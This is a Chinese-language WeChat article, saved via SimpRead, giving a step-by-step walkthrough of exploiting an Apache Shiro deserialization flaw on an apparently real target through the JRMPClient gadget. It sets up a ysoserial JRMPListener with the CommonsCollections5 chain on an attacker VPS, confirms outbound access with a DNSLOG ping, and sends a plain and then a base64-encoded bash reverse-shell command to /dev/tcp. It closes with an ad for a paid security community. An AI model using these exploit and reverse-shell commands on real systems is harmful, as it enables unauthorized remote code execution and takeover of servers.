> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xlm_XLsAETYiOXSGZC7acA)

前言
==

最近在测试中遇到一些 shiro 反序列化不能利用的情况 找到 key 无法找到利用链，但是发现存在 JRMPClient 可用的情况

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOVuKibevu3Dz8IAZZLovUk1oQBQaiaTy7HHMUM0EvoMQ2QVBP15Eg3ricQ/640?wx_fmt=png)

换一种工具尝试

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGO9uWYhmibCjpJD998bMeRJib9cMTDZ3g3rquLVOomuU7TNESH3iaAo9ggw/640?wx_fmt=png)

发现 JRMPClient 可用， 尝试使用 JRMPClient 进行测试，最终这个目标也没有执行成功所以换了一个目标进行的尝试，仅记录 JRMPClient 利用方式。

使用 JRMPClient 模块进行测试
====================

找到一个同样存在 shiro 反序列的目标。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGO9eqwmyddib8p9qAVicPNV5UZClEst7XfnibgEicFIzGMIKzrJ7fv7cP5zg/640?wx_fmt=png)

同样 find: JRMPClient can be use。

搭建 JRMPClient 监听服务
------------------

首先需要搭建 JRMPClient 使用 ysoserial.jar 工具搭建服务，下载地址：https://github.com/frohoff/ysoserial

使用 DNSLOG 进行检测
--------------

在不确定目标是否通外网的情况下 先使用 DNSLOG 进行检测 获取一个新的域名 ：w3dh1h.dnslog.cn

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOZJTP9ZE0jicGpCPic69ube7S4wibYyOLmQSicprbWiaObuZW5mpbRd5GzbA/640?wx_fmt=png)

VPS 上开启 JRMPListener
--------------------

在 VPS 上搭建服务命令

java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping w3dh1h.dnslog.cn"

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOnSyyRmHlzrTQQDBrrx3pD1AOQ3ga0HUXqyBoOdDG2k4Z4ibt7jhhSXw/640?wx_fmt=png)

shiro 反序列利用工具中选择 JRMPClient, 然后输入 VPS 上搭建服务的地址：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOMsbicibyh8ia0D4ibKqTX8Evv6hvAUiayjlDY8DekUhtiajf5TGibe0DQCp7Q/640?wx_fmt=png)

JRMPListener 收到返回信息

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOzdSicibJJg5WtzxZIicZSJPicQtGdZo6iaa2eGfepVhmAl9cInUroDIQrFw/640?wx_fmt=png)

DNSLOG 上收到目标的 ping 命令信息 说明目标服务器通外网

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOE2FsJhw8ehGp6W8G3UV6DqAcK49JJFXwEZwcQ3aL9QiaQ0ZAXy4l4Hw/640?wx_fmt=png)

执行反弹命令
------

执行反弹命令 bash -i >& /dev/tcp/xxxxxx/8888 0>&1

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOoAwkowB1ic0FIMqV4f4LhUbquibklWHFzic6urSfCS4NQia83v3yvbm86A/640?wx_fmt=png)

没有收到反弹链接

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOWr7E6p1RnxUqYIZ2hQ34NT8XSspvqRUAYShEc76B6ptCIYIJF6p0fw/640?wx_fmt=png)

将命令进行 base64 编码 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eHgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGOVJovWE7q1ZslzVzQXexT3NQ4R4TvulTKCQbhTgO8FxbyVKhp0azbZg/640?wx_fmt=png)

成功收到反弹链接

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXXUVibr2uYmcjxo4MJvPvGO9poguVuVR8HXYrWVBoA8sNkYRQbWqdRGKGDVdiaczMibhek1ichJqvfJw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RWbGNtVfIZbm2rmGO4hQDzQUrLN62vEGlA4fPmib5utUAp9gbQicb6FC82RjsVI5vx7wEc9yAAiaFEoQ/640?wx_fmt=gif)

E

N

D

**知识星球产品及服务**

**团队内部平台**：潮汐在线指纹识别平台 | 潮听漏洞情报平台 | 潮巡资产管理与威胁监测平台 | 潮汐网络空间资产测绘 | 潮声漏洞检测平台 | 在线免杀平台 | CTF 练习平台 | 物联网固件检测平台 | SRC 资产监控平台  | ......

**星球分享方向**:Web 安全 | 红蓝对抗 | 移动安全 | 应急响应 | 工控安全 | 物联网安全 | 密码学 | 人工智能 | ctf 等方面的沟通及分享

**星球知识 wiki**：红蓝对抗 | 漏洞武器库 | 远控免杀 | 移动安全 | 物联网安全 | 代码审计 | CTF | 工控安全 | 应急响应 | 人工智能 | 密码学 | CobaltStrike | 安全测试用例 | ......

**星球网盘资料**：安全法律法规 | 安全认证资料 | 代码审计 | 渗透安全工具 | 工控安全工具 | 移动安全工具 | 物联网安全 | 其它安全文库合辑  | ......

扫码加入一起学习吧~

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWbGNtVfIZbm2rmGO4hQDzQvvk4mDJOoZHS64icia8WtbOojy8cia4Ztwv8TTFUkBf4kkdoNEpNKkFbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUGxmZ0l89buUNbyVALKxic2nM7hnDCkAKIrjKhdcDfVkGq3PxNzgs7m55BBMwmicc0AvFpYcrd6J6Q/640?wx_fmt=jpeg)